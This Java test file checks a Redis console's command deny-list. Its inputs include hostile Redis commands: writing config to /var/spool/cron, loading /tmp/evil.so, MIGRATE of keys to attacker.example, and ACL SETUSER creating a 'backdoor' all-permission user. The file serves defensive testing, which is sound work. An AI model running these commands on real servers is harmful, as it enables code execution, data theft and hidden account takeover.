package io.keydra.console.service;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.hasItem;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

import io.keydra.connections.entity.ConnectionProfile;
import io.keydra.console.exception.CommandNotAllowedException;
import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import java.util.List;
import org.junit.jupiter.api.Test;

@QuarkusTest
class CommandPolicyTest {

    @Inject CommandPolicy policy;

    /**
     * A target that allows nothing of its own, which is what every case here was always about.
     *
     * <p>Phase 58 made the decision a question about one target, so it takes one. Null would do the
     * same thing and would read as "no target" rather than as "a target with nothing to say".
     */
    private static final ConnectionProfile SAYS_NOTHING = new ConnectionProfile();

    @Test
    void allowsAnOrdinaryCommand() {
        assertDoesNotThrow(() -> policy.check(SAYS_NOTHING, List.of("GET", "user:1")));
    }

    @Test
    void refusesKeysBecauseItStallsTheServer() {
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("KEYS", "*")));
    }

    @Test
    void refusesCommandsThatNeverReturnOnAPooledConnection() {
        // Each of these would take the application's connection to the target with it.
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("SUBSCRIBE", "c")));
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("MONITOR")));
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("BLPOP", "q", "0")));
    }

    @Test
    void refusesCommandsThatChangeWhatTheServerIs() {
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("SHUTDOWN")));
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("FLUSHALL")));
    }

    @Test
    void refusesSelectBecauseThePooledConnectionWouldStayThere() {
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("SELECT", "3")));
    }

    @Test
    void matchesRegardlessOfCase() {
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("keys", "*")));
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("Keys", "*")));
    }

    @Test
    void publishesWhatItRefusesSoAClientCanSaySoFirst() {
        assertThat(policy.denied(), hasItem("flushall"));
    }

    @Test
    void ignoresAnEmptyCommand() {
        assertDoesNotThrow(() -> policy.check(SAYS_NOTHING, List.of()));
    }

    /**
     * The half of the deny-list that is about the target rather than about Keydra.
     *
     * <p>CONFIG SET dir with a SAVE writes a file wherever the server may write, and MODULE LOAD
     * hands it a shared object to run. Both turn "may edit a value" — which is an operator — into
     * "may execute code on that machine", and the role ladder does not let anybody take that step
     * anywhere else.
     */
    @Test
    void refusesWhatWouldTakeOverTheTarget() {
        assertThrows(
                CommandNotAllowedException.class,
                () ->
                        policy.check(
                                SAYS_NOTHING, List.of("CONFIG", "SET", "dir", "/var/spool/cron")));
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("MODULE", "LOAD", "/tmp/evil.so")));
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("EVAL", "return 1", "0")));
        assertThrows(
                CommandNotAllowedException.class,
                () -> policy.check(SAYS_NOTHING, List.of("SAVE")));
    }

    /** MIGRATE copies keys to any host, past every visibility rule and every audit entry. */
    @Test
    void refusesTheCommandThatCopiesKeysElsewhere() {
        assertThrows(
                CommandNotAllowedException.class,
                () ->
                        policy.check(
                                SAYS_NOTHING,
                                List.of(
                                        "MIGRATE",
                                        "attacker.example",
                                        "6379",
                                        "user:1",
                                        "0",
                                        "5000")));
    }

    /** ACL would create an identity on the target that Keydra cannot show, filter or revoke. */
    @Test
    void refusesCreatingAnIdentityKeydraDoesNotKnowAbout() {
        assertThrows(
                CommandNotAllowedException.class,
                () ->
                        policy.check(
                                SAYS_NOTHING,
                                List.of(
                                        "ACL",
                                        "SETUSER",
                                        "backdoor",
                                        "on",
                                        ">hunter2",
                                        "~*",
                                        "+@all")));
    }
}
